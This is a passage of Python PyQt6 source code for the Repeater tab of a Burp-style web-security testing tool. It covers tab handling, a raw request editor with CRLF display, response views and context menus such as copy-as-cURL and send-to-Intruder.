                          f"padding:8px 12px;border-radius:8px;border:1px solid {T.BORDER}")
        return lbl

    # =========================================================
    # REPEATER  —  Burp/Caido-style dual-pane request/response
    # =========================================================
    def _repeater_tab(self):
        w = QWidget()
        v = QVBoxLayout(w)
        v.setContentsMargins(0, 0, 0, 0)
        v.setSpacing(0)

        # ── Tab widget ────────────────────────────────────────────────────────
        self.rep_tabs = QTabWidget()
        self.rep_tabs.setTabsClosable(True)
        self.rep_tabs.setMovable(True)
        self.rep_tabs.tabCloseRequested.connect(self._rep_close_tab)
        self.rep_tabs.setStyleSheet(
            f"QTabWidget::pane{{border:none;background:{T.BG};}}"
            f"QTabWidget::tab-bar{{background:{T.PANEL};}}"
            f"QTabBar{{background:{T.PANEL};border-bottom:1px solid {T.BORDER};}}"
            f"QTabBar::tab{{padding:8px 18px 8px 10px;font-size:12px;font-weight:500;"
            f"background:{T.PANEL};color:{T.TXT3};border-bottom:2px solid transparent;}}"
            f"QTabBar::tab:selected{{color:{T.BLUE};border-bottom:2px solid {T.BLUE};background:{T.BG};}}"
            f"QTabBar::tab:hover:!selected{{background:{T.SURFACE};}}")

        add_btn = QPushButton("＋")
        add_btn.setFixedSize(26, 26)
        add_btn.setToolTip("New tab…")
        add_btn.setStyleSheet(
            f"background:{T.SURFACE};color:{T.TXT1};border:1px solid {T.BORDER};"
            f"border-radius:6px;font-size:15px;font-weight:bold;margin:4px 6px 0 0;"
            f"padding:0;min-height:0;")
        add_btn.clicked.connect(lambda: self._rep_show_add_menu(add_btn))
        self.rep_tabs.setCornerWidget(add_btn, Qt.Corner.TopRightCorner)

        v.addWidget(self.rep_tabs, 1)

        self._add_rep_tab()
        return w

    def _rep_close_tab(self, idx: int):
        if self.rep_tabs.count() <= 1:
            return
        w = self.rep_tabs.widget(idx)
        try:
            title = self.rep_tabs.tabText(idx)
            if getattr(w, '_kc_is_ws', False):
                closed = {"kind": "ws", "title": title, "url": w._kc_ws_url.text()}
            else:
                closed = {
                    "kind": "http", "title": title,
                    "method": w._kc_method_box.currentText(),
                    "url": w._kc_get_full_url(),
                    "raw_request": w._kc_get_raw(),
                }
            self._rep_closed_tabs.append(closed)
            self._rep_closed_tabs[:] = self._rep_closed_tabs[-20:]
        except Exception:
            pass
        self.rep_tabs.removeTab(idx)

    def _rep_show_add_menu(self, anchor):
        menu = QMenu(anchor)
        menu.setStyleSheet(
            f"QMenu{{background:{T.PANEL};border:1px solid {T.BORDER};border-radius:8px;padding:4px;}}"
            f"QMenu::item{{padding:7px 20px 7px 12px;border-radius:5px;font-size:12px;color:{T.TXT1};}}"
            f"QMenu::item:disabled{{color:{T.TXT3};}}"
            f"QMenu::item:selected{{background:{T.SURFACE};}}"
            f"QMenu::separator{{background:{T.BORDER};height:1px;margin:4px 8px;}}")
        a_http = menu.addAction("＋  New HTTP tab")
        a_ws   = menu.addAction("⚡  New WebSocket tab")
        a_grp  = menu.addAction("🗂  New tab group")
        menu.addSeparator()
        a_reopen = menu.addAction("↩  Reopen closed tab")
        a_reopen.setEnabled(bool(self._rep_closed_tabs))
        menu.addSeparator()
        a_close_all = menu.addAction("🗑  Close all tabs")

        action = menu.exec(anchor.mapToGlobal(anchor.rect().bottomLeft()))
        if action == a_http:
            self._add_rep_tab()
        elif action == a_ws:
            self._add_rep_ws_tab()
        elif action == a_grp:
            self._rep_new_tab_group()
        elif action == a_reopen:
            self._rep_reopen_closed_tab()
        elif action == a_close_all:
            self._rep_close_all_tabs()

    def _rep_reopen_closed_tab(self):
        if not self._rep_closed_tabs:
            return
        closed = self._rep_closed_tabs.pop()
        if closed.get("kind") == "ws":
            self._add_rep_ws_tab(title=closed["title"], url=closed["url"])
        else:
            self._add_rep_tab(title=closed["title"], method=closed["method"],
                               url=closed["url"], raw_request=closed["raw_request"])

    def _rep_close_all_tabs(self):
        while self.rep_tabs.count() > 1:
            self._rep_close_tab(self.rep_tabs.count() - 1)
        # reset the one remaining tab back to a blank HTTP tab
        if self.rep_tabs.count() == 1:
            self.rep_tabs.removeTab(0)
        self._add_rep_tab()

    def _rep_new_tab_group(self):
        name, ok = QInputDialog.getText(self.rep_tabs, "New Tab Group", "Group name:")
        if not ok or not name.strip():
            return
        name = name.strip()
        if name not in self._rep_group_colors:
            color = self._rep_group_palette[len(self._rep_group_colors) % len(self._rep_group_palette)]
            self._rep_group_colors[name] = color
        dot = "●"
        tab = self._add_rep_tab(title=f"{dot} {name}")
        idx = self.rep_tabs.indexOf(tab)
        if idx >= 0:
            self.rep_tabs.tabBar().setTabTextColor(idx, QColor(self._rep_group_colors[name]))

    def _add_rep_tab(self, title="Tab 1", method="GET", url="",
                     raw_request: str = "", headers: str = "", body: str = ""):
        """Burp-style repeater: Target field holds scheme+host; path lives in the
        raw editor's first line. No separate URL bar = no long-URL issues."""
        tab_n = self.rep_tabs.count() + 1

        # ── Split URL into scheme+host vs path-with-query ─────────────────
        def _split_url(full_url: str):
            if not full_url or '://' not in full_url:
                return ("https://", "/")
            p = urlparse(full_url)
            base = f"{p.scheme}://{p.netloc}"
            path = p.path or "/"
            if p.query:   path += "?" + p.query
            if p.fragment: path += "#" + p.fragment
            return base, path

        target_base, url_path = _split_url(url)

        # If we have a full raw request, use it as-is; otherwise build one
        if raw_request:
            initial_raw = raw_request.replace("\r\n", "\n")
            # Ensure first line uses just the path (not an absolute URL)
            lines = initial_raw.split('\n')
            if lines:
                parts0 = lines[0].split(' ', 2)
                if len(parts0) >= 2 and parts0[1].startswith('http'):
                    _, abs_path = _split_url(parts0[1])
                    parts0[1] = abs_path
                    lines[0] = ' '.join(parts0)
                    initial_raw = '\n'.join(lines)
        else:
            host = urlparse(url).netloc or "target.com"
            h_block = headers or f"Host: {host}\nUser-Agent: Kingception/1.0\nAccept: */*"
            cl = f"\nContent-Length: {len(body.encode())}" if body else ""
            initial_raw = f"{method} {url_path} HTTP/1.1\n{h_block}{cl}\n\n{body}"

        _state = {"sending": False, "settings": dict(self.rep_global_settings)}
        from urllib.parse import parse_qsl, urlencode, urljoin

        # ══ ROOT ══
        tab = QWidget()
        rv = QVBoxLayout(tab); rv.setContentsMargins(0,0,0,0); rv.setSpacing(0)

        # ── TOP BAR (Burp-style: Send | Cancel | Target | HTTP ver) ──────
        top_bar = QWidget(); top_bar.setFixedHeight(42)
        top_bar.setStyleSheet(f"background:{T.PANEL};border-bottom:1px solid {T.BORDER};")
        tbl = QHBoxLayout(top_bar); tbl.setContentsMargins(8,4,8,4); tbl.setSpacing(5)

        send_btn   = QPushButton("▶  Send")
        cancel_btn = QPushButton("✕")
        send_btn.setStyleSheet(primary_btn_css()); send_btn.setFixedHeight(30); send_btn.setFixedWidth(88)
        send_btn.setShortcut("Ctrl+Return")
        send_btn.setToolTip("Send request  (Ctrl+Enter)")
        cancel_btn.setFixedSize(30, 30)
        cancel_btn.setToolTip("Cancel in-flight request")
        cancel_btn.setStyleSheet(
            f"background:{T.SURFACE};color:{T.TXT2};border:1px solid {T.BORDER};"
            f"border-radius:6px;font-size:13px;padding:0;min-height:0;")

        method_box = QComboBox()
        method_box.addItems(["GET","POST","PUT","DELETE","PATCH","HEAD","OPTIONS","CONNECT","TRACE"])
        method_box.setCurrentText(method); method_box.setFixedWidth(94); method_box.setFixedHeight(30)
        method_box.setToolTip("HTTP method — also editable in the first line of the request")

        sep1 = QLabel("|")
        sep1.setStyleSheet(f"color:{T.BORDER};font-size:18px;padding:0 2px;")

        target_lbl = QLabel("Target:")
        target_lbl.setStyleSheet(f"color:{T.TXT3};font-size:11px;font-weight:600;")

        target_edit = QLineEdit(target_base)
        target_edit.setObjectName("kc_target_edit")
        target_edit.setFixedHeight(30)
        target_edit.setToolTip(
            "Scheme + host only: https://example.com\n"
            "The path, query string and fragment live in the first line of the request editor.\n"
            "Long paths are handled fine — they scroll in the editor.")
        target_edit.setPlaceholderText("https://target.com")
        target_edit.setStyleSheet(
            f"background:{T.SURFACE};color:{T.CODE};border:1px solid {T.BORDER};"
            f"border-radius:6px;padding:0 8px;font-family:{T.MONO};font-size:11px;")

        class _SegToggle(QWidget):
            """Two-way segmented toggle — Burp's 'HTTP/1 | HTTP/2' control.
            Exposes the same surface a QComboBox would (currentText,
            setCurrentText, currentTextChanged, blockSignals is inherited
            from QWidget/QObject for free) so it drops in anywhere the old
            3-item dropdown was without touching the sync code around it."""
            currentTextChanged = pyqtSignal(str)

            def __init__(self, labeled_options, parent=None):
                super().__init__(parent)
                self._values = [v for v, _ in labeled_options]
                self._current = self._values[0]
                lay = QHBoxLayout(self); lay.setContentsMargins(0, 0, 0, 0); lay.setSpacing(0)
                self._btns = {}
                for val, label in labeled_options:
                    b = QPushButton(label); b.setCheckable(True); b.setFixedHeight(28)
                    b.clicked.connect(lambda _checked=False, v=val: self._select(v))
                    self._btns[val] = b
                    lay.addWidget(b)
                self._btns[self._current].setChecked(True)
                self._restyle()

            def _select(self, val):
                if val == self._current:
                    for v, b in self._btns.items(): b.setChecked(v == self._current)
                    return
                self._current = val
                for v, b in self._btns.items(): b.setChecked(v == val)
                self._restyle()
                self.currentTextChanged.emit(val)

            def _restyle(self):
                n = len(self._values)
                for i, (val, b) in enumerate(self._btns.items()):
                    rl = "6px" if i == 0 else "0px"
                    rr = "6px" if i == n - 1 else "0px"
                    if b.isChecked():
                        b.setStyleSheet(
                            f"QPushButton{{background:{T.BLUE};color:{T.ON_ACCENT};border:1px solid {T.BLUE};"
                            f"border-top-left-radius:{rl};border-bottom-left-radius:{rl};"
                            f"border-top-right-radius:{rr};border-bottom-right-radius:{rr};"
                            f"font-size:10px;font-weight:600;padding:0 10px;}}")
                    else:
                        b.setStyleSheet(
                            f"QPushButton{{background:{T.SURFACE};color:{T.TXT2};border:1px solid {T.BORDER};"
                            f"border-top-left-radius:{rl};border-bottom-left-radius:{rl};"
                            f"border-top-right-radius:{rr};border-bottom-right-radius:{rr};"
                            f"font-size:10px;padding:0 10px;}}"
                            f"QPushButton:hover{{background:{T.BORDER};}}")

            def currentText(self):
                return self._current

            def setCurrentText(self, text):
                self._select("HTTP/2" if "2" in text else self._values[0])

        def _ib(txt, tip, w2=26):
            b = QPushButton(txt); b.setFixedSize(w2, 30); b.setToolTip(tip)
            b.setStyleSheet(f"background:{T.SURFACE};color:{T.TXT2};"
                            f"border:1px solid {T.BORDER};border-radius:6px;"
                            f"font-size:13px;padding:0;min-height:0;")
            return b

        copy_url_btn = _ib("🔗",  "Copy full URL to clipboard")
        rename_btn   = _ib("✏",  "Rename this tab")
        dup_btn      = _ib("📑",  "Duplicate this tab")
        clr_btn      = _ib("🗑",  "Clear response")
        settings_gear_btn = _ib("⚙", "Repeater settings for this tab", w2=28)

        tbl.addWidget(send_btn); tbl.addWidget(settings_gear_btn); tbl.addWidget(cancel_btn)
        tbl.addWidget(method_box); tbl.addWidget(sep1)
        tbl.addWidget(target_lbl); tbl.addWidget(target_edit, 1)
        tbl.addSpacing(4)
        for _bx in [copy_url_btn, rename_btn, dup_btn, clr_btn]:
            tbl.addWidget(_bx)
        rv.addWidget(top_bar)

        # ── URL helper: always reconstruct from target + path in editor ───
        def _get_full_url() -> str:
            """Return the complete URL: target_edit (scheme+host) + path from request line."""
            base = target_edit.text().strip().rstrip('/')
            raw  = _get_raw()
            first = raw.split('\n')[0] if raw else ''
            parts = first.split(' ')
            path  = parts[1] if len(parts) >= 2 else '/'
            # If the path is already an absolute URL (proxy-style), use it directly
            if path.startswith('http://') or path.startswith('https://'):
                return path
            return base + (path if path.startswith('/') else '/' + path)

        # ── Target ↔ Host-header sync ─────────────────────────────────────
        def _target_changed(new_base: str):
            """When user edits the Target field, update the Host: header to match."""
            try:
                host_part = urlparse(new_base).netloc or new_base.split('://')[-1].split('/')[0]
                lines = _get_raw().split('\n')
                for i, ln in enumerate(lines):
                    if ln.lower().startswith('host:'):
                        lines[i] = f"Host: {host_part}"
                        _set_raw('\n'.join(lines))
                        break
            except Exception:
                pass

        target_edit.editingFinished.connect(lambda: _target_changed(target_edit.text()))

        # ── OPTIONS BAR (status/time/size — toggles moved to ⚙ Settings) ───
        opts = QWidget(); opts.setFixedHeight(26)
        opts.setStyleSheet(f"background:{T.SURFACE};border-bottom:1px solid {T.BORDER};")
        obl = QHBoxLayout(opts); obl.setContentsMargins(10,0,10,0); obl.setSpacing(14)

        status_lbl = QLabel("—"); time_lbl = QLabel(""); size_lbl = QLabel("")
        cl_lbl = QLabel("0 B")
        for _l in [status_lbl, time_lbl, size_lbl]:
            _l.setStyleSheet(f"color:{T.TXT3};font-size:11px;font-family:{T.MONO};")
        cl_lbl.setStyleSheet(f"color:{T.CYAN};font-size:11px;font-family:{T.MONO};")
        obl.addStretch()
        for _lx, _vx in [("Status:", status_lbl),("Time:", time_lbl),("Size:", size_lbl)]:
            _xx = QLabel(_lx); _xx.setStyleSheet(f"color:{T.TXT3};font-size:10px;")
            obl.addWidget(_xx); obl.addWidget(_vx)
        obl.addSpacing(10); obl.addWidget(cl_lbl)
        rv.addWidget(opts)

        # ── MAIN SPLIT: request | response ──────────────────────────────
        split = QSplitter(Qt.Orientation.Horizontal)
        split.setHandleWidth(2)
        split.setStyleSheet(
            f"QSplitter::handle{{background:{T.BORDER};}}"
            f"QSplitter::handle:hover{{background:{T.BLUE};}}")

        # ── REQUEST PANEL ────────────────────────────────────────────────
        req_panel = QWidget()
        req_vl = QVBoxLayout(req_panel); req_vl.setContentsMargins(0,0,0,0); req_vl.setSpacing(0)

        req_hb = QWidget(); req_hb.setFixedHeight(26)
        req_hb.setStyleSheet(f"background:{T.PANEL};border-bottom:1px solid {T.BORDER};")
        rhl = QHBoxLayout(req_hb); rhl.setContentsMargins(10,0,6,0); rhl.setSpacing(4)
        _rt = QLabel("REQUEST")
        _rt.setStyleSheet(f"color:{T.TXT3};font-size:9px;font-weight:700;letter-spacing:2px;")
        rhl.addWidget(_rt); rhl.addStretch()

        crlf_btn = QPushButton("\\n")
        crlf_btn.setCheckable(True); crlf_btn.setFixedSize(26, 20)
        crlf_btn.setToolTip("Show \\r\\n line-ending characters (Burp-style toggle)")
        crlf_btn.setStyleSheet(
            f"QPushButton{{background:{T.SURFACE};color:{T.TXT2};"
            f"border:1px solid {T.BORDER};border-radius:4px;padding:0;min-height:0;"
            f"font-family:{T.MONO};font-size:10px;font-weight:700;}}"
            f"QPushButton:checked{{background:{T.BLUE};color:{T.ON_ACCENT};border-color:{T.BLUE};}}"
            f"QPushButton:hover{{border-color:{T.BLUE};}}")
        rhl.addWidget(crlf_btn)
        line_lbl = QLabel("0 L")
        line_lbl.setStyleSheet(f"color:{T.TXT3};font-size:10px;font-family:{T.MONO};")
        rhl.addWidget(line_lbl)
        req_vl.addWidget(req_hb)

        req_editor = QPlainTextEdit()
        req_editor.setObjectName("kc_req_editor")
        req_editor.setFont(mono_font(11))
        req_editor.setPlainText(initial_raw)
        req_editor.setLineWrapMode(QPlainTextEdit.LineWrapMode.NoWrap)
        req_editor.setStyleSheet(
            f"background:{T.BG};color:{T.CODE};border:none;border-radius:0;"
            f"padding:10px;font-family:{T.MONO};font-size:11px;")
        HTTPHighlighter(req_editor.document())

        # ── \r\n display abstraction ──────────────────────────────────────
        _crlf_view = {"on": False}
        _CRLF_MARK = " \\r \\n"

        def _strip_marks(text: str) -> str:
            lines = text.split('\n')
            return '\n'.join(
                l[:-len(_CRLF_MARK)] if l.endswith(_CRLF_MARK) else l
                for l in lines)

        def _add_marks(text: str) -> str:
            lines = text.split('\n'); n = len(lines)
            return '\n'.join(
                f"{l}{_CRLF_MARK}" if i < n - 1 else l
                for i, l in enumerate(lines))

        def _get_raw() -> str:
            current = req_editor.toPlainText()
            return _strip_marks(current) if _crlf_view["on"] else current

        def _set_raw(new_text: str):
            display = _add_marks(new_text) if _crlf_view["on"] else new_text
            req_editor.blockSignals(True)
            req_editor.setPlainText(display)
            req_editor.blockSignals(False)
            _refresh_labels()
            _refresh_inspector()

        def _refresh_labels():
            raw = _get_raw()
            _, _b = self._parse_raw_request(raw)
            cl_lbl.setText(f"{len(_b or b'')} B")
            line_lbl.setText(f"{raw.count(chr(10)) + 1} L")

        req_editor.textChanged.connect(_refresh_labels)
        _refresh_labels()

        def _toggle_crlf_view(checked: bool):
            real = _get_raw()
            _crlf_view["on"] = checked
            display = _add_marks(real) if checked else real
            req_editor.blockSignals(True)
            req_editor.setPlainText(display)
            req_editor.blockSignals(False)
            _refresh_labels()
        crlf_btn.toggled.connect(_toggle_crlf_view)

        # ── Enter-key filter (Burp \r\n auto-mark) ───────────────────────
        class _EnterFilter(QObject):
            def eventFilter(self, obj, event):
                from PyQt6.QtCore import QEvent
                from PyQt6.QtGui import QTextCursor as _QTC
                if (event.type() == QEvent.Type.KeyPress
                        and _crlf_view["on"]
                        and event.key() in (Qt.Key.Key_Return, Qt.Key.Key_Enter)):
                    cur = req_editor.textCursor()
                    cur.insertText("\n" + _CRLF_MARK)
                    cur.movePosition(_QTC.MoveOperation.Left,
                                     _QTC.MoveMode.MoveAnchor, len(_CRLF_MARK))
                    req_editor.setTextCursor(cur)
                    return True
                return False

        req_editor._enter_filter = _EnterFilter(req_editor)
        req_editor.installEventFilter(req_editor._enter_filter)

        # ── Right-click context menu ──────────────────────────────────────
        req_editor.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)

        def _req_ctx_menu(pos):
            menu = QMenu(req_editor)
            menu.setStyleSheet(
                f"QMenu{{background:{T.PANEL};border:1px solid {T.BORDER};border-radius:8px;padding:4px;}}"
                f"QMenu::item{{padding:7px 20px 7px 12px;border-radius:5px;font-size:12px;color:{T.TXT1};}}"
                f"QMenu::item:selected{{background:{T.SURFACE};}}"
                f"QMenu::separator{{background:{T.BORDER};height:1px;margin:4px 8px;}}")

            a_method  = menu.addAction("⚙  Change Method…")
            a_add_hdr = menu.addAction("＋  Add Header…")
            a_del_hdr = menu.addAction("－  Remove Header…")
            menu.addSeparator()
            a_nl      = menu.addAction("↵  Insert New Line")
            a_bfy     = menu.addAction("✨  Beautify JSON / XML")
            a_cl      = menu.addAction("📐  Recalculate Content-Length")
            menu.addSeparator()
            a_copy_r  = menu.addAction("📋  Copy Request")
            a_curl    = menu.addAction("⌨  Copy as cURL")
            a_copy_u  = menu.addAction("🔗  Copy Full URL")
            menu.addSeparator()
            a_send_i  = menu.addAction("💣  Send to Intruder")
            a_send_seq = menu.addAction("🎲  Send to Sequencer")
            a_csrf    = menu.addAction("🛡  Generate CSRF PoC")
            a_crlf    = menu.addAction(
                "\\n  Hide \\r\\n Line Endings" if _crlf_view["on"]
                else "\\n  Show \\r\\n Line Endings")

            action = menu.exec(req_editor.mapToGlobal(pos))

            if action == a_method:
                methods = ["GET","POST","PUT","DELETE","PATCH","HEAD","OPTIONS","CONNECT","TRACE"]
                m, ok = QInputDialog.getItem(tab,"Change Method","Method:",methods,
                    methods.index(method_box.currentText())
                    if method_box.currentText() in methods else 0, False)
                if ok and m:
                    method_box.setCurrentText(m)
            elif action == a_add_hdr:
                h, ok = QInputDialog.getText(tab,"Add Header","Header (Name: Value):",
                                             text="X-Custom: value")
                if ok and ":" in h:
                    _insert_header(h.strip())
            elif action == a_del_hdr:
                hds, _ = self._parse_raw_request(_get_raw())
                if hds:
                    nm, ok = QInputDialog.getItem(tab,"Remove Header","Select:",
                                                  list(hds.keys()),0,False)
                    if ok: _remove_header(nm)
            elif action == a_nl:
                cur = req_editor.textCursor()
                cur.insertText("\n"); req_editor.setTextCursor(cur); req_editor.setFocus()
            elif action == a_bfy:    _beautify()
            elif action == a_cl:     _recalc_cl()
            elif action == a_copy_r: QApplication.clipboard().setText(_get_raw())
            elif action == a_curl:   _copy_as_curl()
            elif action == a_copy_u: QApplication.clipboard().setText(_get_full_url())
            elif action == a_send_i:
                hds2, bdy2 = self._parse_raw_request(_get_raw())
                self.intr_url.setText(_get_full_url())
                self.intr_method.setCurrentText(method_box.currentText())
                self.intr_headers.setPlainText("\n".join(f"{k}: {v}" for k,v in hds2.items()))
                self.intr_body.setPlainText((bdy2 or b"").decode("utf-8","replace"))
                self.tabs.setCurrentIndex(3)
            elif action == a_send_seq:
                self._send_to_sequencer(_get_full_url(), _get_raw())
            elif action == a_csrf:
                self._show_csrf_poc_dialog(self._gen_csrf_poc(_get_raw(), _get_full_url()))
            elif action == a_crlf:
                crlf_btn.setChecked(not _crlf_view["on"])

        def _copy_as_curl():
            import shlex
            hds, bdy = self._parse_raw_request(_get_raw())
            bstr = (bdy or b'').decode('utf-8', 'replace')
            curl = "curl -X " + method_box.currentText() + " " + shlex.quote(_get_full_url())
            for k2, v2 in hds.items():
                curl += " -H " + shlex.quote(f"{k2}: {v2}")
            if bdy:
                curl += " -d " + shlex.quote(bstr)
            QApplication.clipboard().setText(curl)

        req_editor.customContextMenuRequested.connect(_req_ctx_menu)
        req_vl.addWidget(req_editor, 1)
        split.addWidget(req_panel)

        # ── RESPONSE PANEL ───────────────────────────────────────────────
        resp_panel = QWidget()
        resp_vl = QVBoxLayout(resp_panel)
        resp_vl.setContentsMargins(0,0,0,0); resp_vl.setSpacing(0)

        resp_tabs = QTabWidget()
        resp_tabs.setStyleSheet(
            f"QTabWidget::pane{{border:none;background:{T.BG};}}"
            f"QTabBar::tab{{padding:5px 14px;font-size:11px;background:{T.PANEL};"
            f"color:{T.TXT3};border-bottom:2px solid transparent;}}"
            f"QTabBar::tab:selected{{color:{T.BLUE};border-bottom:2px solid {T.BLUE};}}"
            f"QTabBar::tab:hover:!selected{{background:{T.SURFACE};}}")

        resp_tool = QWidget(); resp_tool.setFixedHeight(30)
        resp_tool.setStyleSheet(f"background:{T.PANEL};border-bottom:1px solid {T.BORDER};")
        rtl = QHBoxLayout(resp_tool)
        rtl.setContentsMargins(10,0,6,0); rtl.setSpacing(4)
        _rl2 = QLabel("RESPONSE")
        _rl2.setStyleSheet(f"color:{T.TXT3};font-size:9px;font-weight:700;letter-spacing:2px;")
        rtl.addWidget(_rl2); rtl.addStretch()
        resp_badge = QLabel("")
        resp_badge.setStyleSheet(f"color:{T.TXT3};font-size:10px;font-family:{T.MONO};")
        rtl.addWidget(resp_badge); rtl.addSpacing(8)

        def _rtb(lbl, tip, checkable=False):
            b = QPushButton(lbl); b.setFixedHeight(22)
            b.setCheckable(checkable); b.setToolTip(tip)
            b.setStyleSheet(
                f"QPushButton{{background:{T.SURFACE};color:{T.TXT2};"
                f"border:1px solid {T.BORDER};border-radius:4px;"
                f"font-size:10px;padding:0 8px;font-family:{T.MONO};}}"
                f"QPushButton:checked{{background:{T.BLUE};color:{T.ON_ACCENT};border-color:{T.BLUE};}}"
                f"QPushButton:hover{{border-color:{T.BLUE};}}")
            return b

        resp_wrap_btn = _rtb("⇌",   "Toggle word wrap",                     checkable=True)
        resp_copy_btn = _rtb("Copy",    "Copy entire response to clipboard")
        resp_url_btn  = _rtb("Copy URL","Copy full URL to clipboard")
        resp_save_btn = _rtb("Save",    "Save response body to file")
        resp_more_btn = _rtb("≡",       "More actions")

        for _bx in [resp_wrap_btn, resp_copy_btn,
                    resp_url_btn, resp_save_btn, resp_more_btn]:
            rtl.addWidget(_bx)
        resp_vl.addWidget(resp_tool)
        resp_vl.addWidget(resp_tabs, 1)
        split.addWidget(resp_panel)

        # ── Response editors ─────────────────────────────────────────────
        def _ro(wrap=False, fs=10):
            e = QPlainTextEdit(); e.setReadOnly(True); e.setFont(mono_font(fs))
            if not wrap: e.setLineWrapMode(QPlainTextEdit.LineWrapMode.NoWrap)
            e.setStyleSheet(
                f"background:{T.BG};color:{T.CODE};"
                f"border:none;padding:8px;font-family:{T.MONO};")
            return e

        raw_resp    = _ro(); raw_resp.setPlaceholderText("Hit Send to see the response…")
        HTTPHighlighter(raw_resp.document())
        hdrs_resp   = _ro()
        body_resp   = _ro(wrap=True)
        pretty_resp = _ro(wrap=True)
        hex_resp    = _ro(fs=9)
        render_view = QTextBrowser()
        render_view.setOpenExternalLinks(False)
        render_view.setStyleSheet("background:#ffffff;color:#000000;border:none;padding:8px;")

        resp_tabs.addTab(raw_resp,    "Raw")
        resp_tabs.addTab(hdrs_resp,   "Headers")
        resp_tabs.addTab(body_resp,   "Body")
        resp_tabs.addTab(pretty_resp, "Pretty")
        resp_tabs.addTab(hex_resp,    "Hex")
        resp_tabs.addTab(render_view, "Render")

        _resp_editors = [raw_resp, hdrs_resp, body_resp, pretty_resp, hex_resp]

        def _resp_active():
            idx = resp_tabs.currentIndex()
            return _resp_editors[idx] if idx < len(_resp_editors) else None

        def _toggle_resp_wrap(checked):
            mode = (QPlainTextEdit.LineWrapMode.WidgetWidth if checked
                    else QPlainTextEdit.LineWrapMode.NoWrap)
            for ed in _resp_editors: ed.setLineWrapMode(mode)

        def _copy_resp():
            ed = _resp_active()
            txt = ed.toPlainText() if ed else raw_resp.toPlainText()
            QApplication.clipboard().setText(txt)

        def _save_resp():
            ed = _resp_active()
            txt = ed.toPlainText() if ed else raw_resp.toPlainText()
            if not txt: return
            path, _ = QFileDialog.getSaveFileName(
                tab, "Save Response", "response.txt",
                "Text (*.txt);;HTML (*.html);;All (*.*)")
            if path:
                open(path, 'w', encoding='utf-8').write(txt)
                self._log(f"[Repeater] Response saved to {path}")

        def _resp_more_menu():
            menu = QMenu(resp_more_btn)
            menu.setStyleSheet(
                f"QMenu{{background:{T.PANEL};border:1px solid {T.BORDER};"
                f"border-radius:8px;padding:4px;}}"
                f"QMenu::item{{padding:7px 20px 7px 12px;border-radius:5px;"
                f"font-size:12px;color:{T.TXT1};}}"
                f"QMenu::item:selected{{background:{T.SURFACE};}}"
                f"QMenu::separator{{background:{T.BORDER};height:1px;margin:4px 8px;}}")
            a_copy_all    = menu.addAction("📋  Copy entire response")
            a_copy_url    = menu.addAction("🔗  Copy full URL")
            a_copy_curl   = menu.addAction("⌨  Copy request as cURL")
            a_copy_sel    = menu.addAction("📄  Copy selected text")
            menu.addSeparator()
            a_save        = menu.addAction("💾  Save response to file")
            a_save_req    = menu.addAction("💾  Save request to file")
            menu.addSeparator()
            a_to_decoder  = menu.addAction("🔐  Send to Decoder")
            a_to_intruder = menu.addAction("💣  Send to Intruder")
            menu.addSeparator()
            a_search      = menu.addAction("🔍  Search in response…")
            a_open_render = menu.addAction("🌐  Open in Render tab")
            menu.addSeparator()
            a_csrf        = menu.addAction("🛡  Generate CSRF PoC")

            action = menu.exec(resp_more_btn.mapToGlobal(
                resp_more_btn.rect().bottomLeft()))

            if action == a_copy_all:   _copy_resp()
            elif action == a_copy_url: QApplication.clipboard().setText(_get_full_url())
            elif action == a_copy_curl: _copy_as_curl()
            elif action == a_copy_sel:
                ed = _resp_active()
                if ed: QApplication.clipboard().setText(ed.textCursor().selectedText())
            elif action == a_save:    _save_resp()
            elif action == a_save_req:
                path, _ = QFileDialog.getSaveFileName(
                    tab,"Save Request","request.txt","Text (*.txt);;All (*.*)")
                if path: open(path,'w',encoding='utf-8').write(_get_raw())
            elif action == a_to_decoder:
                ed = _resp_active()
                txt = (ed.toPlainText() if ed else raw_resp.toPlainText()).strip()
                if txt:
                    self.tabs.setCurrentIndex(5)
                    try: self.dec_in.setPlainText(txt)
                    except Exception: pass
            elif action == a_to_intruder:
                hds2, bdy2 = self._parse_raw_request(_get_raw())
                self.intr_url.setText(_get_full_url())
                self.intr_method.setCurrentText(method_box.currentText())
                self.intr_headers.setPlainText(
                    "\n".join(f"{k}: {v}" for k,v in hds2.items()))
                self.intr_body.setPlainText((bdy2 or b"").decode("utf-8","replace"))
                self.tabs.setCurrentIndex(3)
            elif action == a_search:
                term, ok = QInputDialog.getText(tab,"Search Response","Search for:")
                if ok and term:
                    ed = _resp_active() or raw_resp
                    if not ed.find(term):
                        QMessageBox.information(tab,"Search",f'"{term}" not found')
            elif action == a_open_render:
                resp_tabs.setCurrentIndex(5)
            elif action == a_csrf:
                self._show_csrf_poc_dialog(self._gen_csrf_poc(_get_raw(), _get_full_url()))

        # ── Response right-click ─────────────────────────────────────────
        def _install_resp_ctx(editor):
            editor.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
            def _ctx(pos):
                menu = QMenu(editor)
                menu.setStyleSheet(
                    f"QMenu{{background:{T.PANEL};border:1px solid {T.BORDER};"
                    f"border-radius:8px;padding:4px;}}"
                    f"QMenu::item{{padding:7px 20px 7px 12px;border-radius:5px;"
                    f"font-size:12px;color:{T.TXT1};}}"
                    f"QMenu::item:selected{{background:{T.SURFACE};}}"
                    f"QMenu::separator{{background:{T.BORDER};height:1px;margin:4px 8px;}}")
                a_copy_sel  = menu.addAction("Copy")
                a_copy_all  = menu.addAction("Copy all")
                a_copy_url  = menu.addAction("Copy full URL")
                a_copy_curl = menu.addAction("Copy as curl command (bash)")
                menu.addSeparator()
                a_save      = menu.addAction("Save response to file")
                a_save_req  = menu.addAction("Save request to file")
                menu.addSeparator()
                a_search    = menu.addAction("Search…")
                a_to_dec    = menu.addAction("Send to Decoder")
                a_to_intr   = menu.addAction("Send to Intruder")
                a_render    = menu.addAction("Open in Render tab")
                menu.addSeparator()
                a_csrf_r    = menu.addAction("🛡  Generate CSRF PoC")
                menu.addSeparator()
                a_sel_all   = menu.addAction("Select all")

                act = menu.exec(editor.mapToGlobal(pos))
                if act == a_copy_sel:
                    QApplication.clipboard().setText(editor.textCursor().selectedText())
                elif act == a_copy_all:    _copy_resp()
                elif act == a_copy_url:    QApplication.clipboard().setText(_get_full_url())
                elif act == a_copy_curl:   _copy_as_curl()
                elif act == a_save:        _save_resp()
                elif act == a_save_req:
                    path, _ = QFileDialog.getSaveFileName(
                        tab,"Save Request","request.txt","Text (*.txt);;All (*.*)")
                    if path: open(path,'w',encoding='utf-8').write(_get_raw())
                elif act == a_search:
                    term, ok = QInputDialog.getText(tab,"Search Response","Search for:")
